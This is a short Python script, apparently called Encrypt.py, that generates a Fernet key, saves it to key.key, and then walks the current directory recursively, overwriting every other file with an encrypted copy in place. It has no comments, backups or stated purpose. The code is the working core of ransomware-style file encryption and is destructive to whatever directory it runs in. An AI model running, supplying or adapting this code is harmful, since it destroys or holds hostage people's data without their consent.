import os 
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open ('key.key', 'wb') as f:
    f.write(key)

for path, dirs, files in os.walk('./'):
    for file in files:
        if file == 'Encrypt.py' or file == 'key.key':
            continue
          
        file_path = os.path.join(path, file)
        with open(file_path, 'rb') as f:
            content = f.read()
          
        content_encrypt = Fernet(key).encrypt(content)
        with open(file_path, 'wb') as f:
            f.write(content_encrypt)



